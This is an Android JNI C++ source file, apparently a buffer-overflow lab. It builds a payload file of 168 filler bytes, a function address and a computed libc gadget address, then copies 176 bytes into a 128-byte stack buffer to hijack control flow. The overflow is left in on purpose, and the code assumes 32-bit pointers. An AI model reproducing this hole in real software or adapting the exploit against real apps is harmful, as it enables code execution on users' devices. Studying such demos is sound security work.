#include <jni.h>
#include <string>
#include <fcntl.h>
#include <unistd.h>
#include "libhello-test.h"
#include <sys/mman.h>
#include <dlfcn.h>

// Find the load address of the shared library

extern "C" __attribute__((visibility("default"))) JNIEXPORT jstring JNICALL
Java_com_example_myapplication3_MainActivity_sumFromCustomJNI(
        JNIEnv* env,
        jobject /* this */) {

    char *str=(char*)malloc(260);
    FILE* f;
    int param=42;
    void *(*alloc_memory_func_ptr)(size_t);
    alloc_memory_func_ptr=&alloc_memory;
    char target[128];

    // get the libc.so baseaddress
    void* symbol_address = dlsym(RTLD_DEFAULT, "printf");
    Dl_info info;
    int result = dladdr(symbol_address, &info);
    unsigned int libcbase = (unsigned int)(uintptr_t)info.dli_fbase + 0xb0e62;
    unsigned char bytes[4];
    unsigned int funcaddr= (unsigned int) &alloc_memory;
    unsigned char bytes1[4];
    bytes[3] = (libcbase >> 24) & 0xFF;
    bytes[2] = (libcbase >> 16) & 0xFF;
    bytes[1] = (libcbase >> 8) & 0xFF;
    bytes[0] = libcbase & 0xFF;
    bytes1[3] = (funcaddr >> 24) & 0xFF;
    bytes1[2] = (funcaddr >> 16) & 0xFF;
    bytes1[1] = (funcaddr >> 8) & 0xFF;
    bytes1[0] = funcaddr & 0xFF;
    if (result && libcbase == NULL) {
        exit(0);
    }

    memset(target,NULL,128);
    f=fopen("/data/data/com.example.myapplication3/files/payload.txt","a+b");
    if(f!=NULL) {
        for(int i=0;i<168;i++) fwrite("A",sizeof(char),1,f);
        fwrite(bytes1,sizeof(unsigned char),4,f);
        fwrite(bytes,sizeof(unsigned char),4,f);
        fseek(f,0,SEEK_SET);
        int n=fread(str,sizeof(char),176,f);
        memcpy(target,str,176);
        fclose(f);
    }
    else {
        sprintf(target,"File Open Fail...\n");
    }

    void *p =(alloc_memory_func_ptr)(param);
    free(p);
    std::string myString = "Called";
    return env->NewStringUTF(myString.c_str());
}
